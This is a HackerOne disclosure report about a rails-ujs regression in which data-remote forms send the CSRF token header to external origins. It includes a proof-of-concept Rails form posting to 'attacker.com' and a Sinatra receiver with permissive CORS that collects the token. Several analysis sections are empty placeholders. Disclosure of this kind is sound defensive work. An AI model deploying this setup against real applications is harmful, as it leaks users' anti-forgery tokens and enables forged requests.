# CSRF header is sent to external websites when using data-remote forms

## Metadata
- **Source:** HackerOne
- **Report:** 189878 | https://hackerone.com/reports/189878
- **Submitted:** 2016-12-09
- **Reporter:** mastahyeti
- **Program:** Unknown
- **Bounty:** Not disclosed
- **Severity:** low
- **Vuln:** Cross-Site Request Forgery (CSRF)
- **CVEs:** CVE-2020-8167, CVE-2015-1840
- **Category:** web-api

## Summary
Looks like there is a regression in the fix for CVE-2015-1840 ([H1 report](https://hackerone.com/reports/49935)). The origin isn't being checked before adding a CSRF header to `data-remote` forms. I noticed this when checking out the new rails-ujs repo.

Example Rails template:

```
<%= form_tag "http://attacker.com", remote: true do %>
  <button type=submit>submit</button>
<% end %>
```

Example 

## Attack scenario
*(see original)*

## Root cause
*(see original)*

## Attacker mindset
*(see original)*

## Defensive takeaways
*(see original)*

## Variant hunting
*(see original)*

## MITRE ATT&CK
*(see original)*

## Notes
*(see original)*

## Full report
<details><summary>Expand</summary>

Looks like there is a regression in the fix for CVE-2015-1840 ([H1 report](https://hackerone.com/reports/49935)). The origin isn't being checked before adding a CSRF header to `data-remote` forms. I noticed this when checking out the new rails-ujs repo.

Example Rails template:

```
<%= form_tag "http://attacker.com", remote: true do %>
  <button type=submit>submit</button>
<% end %>
```

Example http://attacker.com app

```
require "sinatra"

options '/*' do
  headers['Access-Control-Allow-Origin'] = "*"
  headers['Access-Control-Allow-Methods'] = "POST"
  headers['Access-Control-Allow-Headers'] ="x-csrf-token"
end

post '/*' do
  "foo"
end
```

When the form is submitted, an XHR request to attacker.com is sent, including the `X-CSRF-Token` header.

PS: @tenderlove told me to submit this here. I shouldn't get paid since I'm one of the GitHub folks who reviews these H1 submissions now.

</details>

---
*Analysed by Claude on 2026-05-24*
